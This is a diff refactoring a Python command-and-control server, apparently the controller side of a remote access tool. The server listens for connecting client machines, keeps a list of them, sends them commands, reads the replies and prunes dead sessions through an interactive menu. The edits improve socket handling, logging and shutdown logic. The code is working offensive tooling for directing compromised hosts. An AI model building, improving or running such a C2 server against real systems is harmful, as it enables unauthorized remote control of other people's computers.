@@ -4,7 +4,7 @@ import atexit
 import signal
 import os
 import time
-from pwn import *
+from pwn import log, str_input, options, splash
 
 art = r"""______  ___ ___________  ___  _____  _____  / \____/ \        /  \
 | ___ \/ _ \_   _| ___ \/ _ \/  __ \|  ___| \_      _/_______/ /\ \
@@ -20,7 +20,7 @@ class C2Server:
     def __init__(self, host='0.0.0.0', port=5555):
         self.host = host
         self.port = port
-        self.clients = []
+        self.clients: list[socket.socket] = []
         self.current_client_index = 0
         self.running = True
         self.server = None
@@ -29,42 +29,50 @@ class C2Server:
     def start(self):
         if self.server:
             self.server.close()
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
-        self.server.bind((self.host, self.port))
-        self.server.listen(10)
-        self.server.settimeout(1.0)
-        self.listening = log.waitfor(f"{self.host}:{self.port} Status", status = 'Listening')
-        self.listening.success()
-        while self.running:
-            try:
-                client_socket, addr = self.server.accept()
-                log.info(f"Accepted connection from {addr[0]}:{addr[1]}")
-                self.clients.append(client_socket)
-            except socket.timeout:
-                continue
-            except OSError:
-                break
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+            s.bind((self.host, self.port))
+            s.listen(10)
+            s.settimeout(1.0)
+            self.server = s
+
+            self.listening = log.waitfor(f"{self.host}:{self.port} Status", status='Listening')
+            self.listening.success()
+
+            while self.running:
+                try:
+                    client_socket, addr = s.accept()
+                    log.info(f"Accepted connection from {addr[0]}:{addr[1]}")
+                    self.clients.append(client_socket)
+                except socket.timeout:
+                    continue
+                except OSError:
+                    break
 
     def stop(self):
         self.running = False
+
         if self.server:
             try:
                 self.server.shutdown(socket.SHUT_RDWR)
             except OSError:
                 pass
-            self.server.close()
-            self.server= None
-        for client in self.clients:
+            finally:
+                self.server.close()
+                self.server = None
+
+        for client in self.clients[:]:
             try:
                 client.close()
             except OSError:
                 pass
-        self.clients.clear()
+            finally:
+                self.clients.remove(client)
+
         if self.listening:
             self.listening.success()
-
 
     def select_client(self, choice):
         if not self.clients:
@@ -75,7 +83,7 @@ class C2Server:
     def send_command(self, command):
         client = self.select_client(self.current_client_index)
         if not client:
-            log.info("[!] No active clients")
+            log.warning("[!] No active clients")
             return
         if command.strip() == "":
             return
@@ -85,14 +93,20 @@ class C2Server:
             response = client.recv(4096).decode()
             return response
         except Exception as e:
-            log.info(f"[!] Error: {e}")
+            log.warning(f"[!] Error: {e}")
             self.clients.remove(client)
 
     def remove_dead(self):
-        for checkclient in self.clients:
-            response = self.send_command("info")
-            if response == "":
-                self.clients.remove(checkclient)
+        alive_clients = []
+        for client in self.clients:
+            try:
+                client.send("info".encode())
+                client.settimeout(1)
+                if client.recv(1024):
+                    alive_clients.append(client)
+            except (socket.error, ConnectionResetError):
+                continue
+        self.clients = alive_clients
 
 if __name__ == "__main__":
     items = ["Start Server","Check Clients", "Connect to Client", "Exit"]
@@ -109,9 +123,8 @@ if __name__ == "__main__":
     signal.signal(signal.SIGINT, handle_sigint)
 
     def resetgui():
-        time.sleep(0.01)
         input("\nPress enter to continue...")
-        os.system("clear")
+        os.system("cls" if os.name == "nt" else "clear")
         
     def interactive():
         run = True
@@ -177,16 +190,11 @@ if __name__ == "__main__":
                         else:
                             log.info("Returning...\n")
                             run = False
-                                                
                 else:
                     log.info("No clients connected")
         else:
-            server.stop
-            os.system("clear")
+            server.stop()
+            os.system("cls" if os.name == "nt" else "clear")
             ratrace = False
             splash()
         resetgui()
-
-
-        #command = str_input('C2> ')
-        #server.send_command(command)
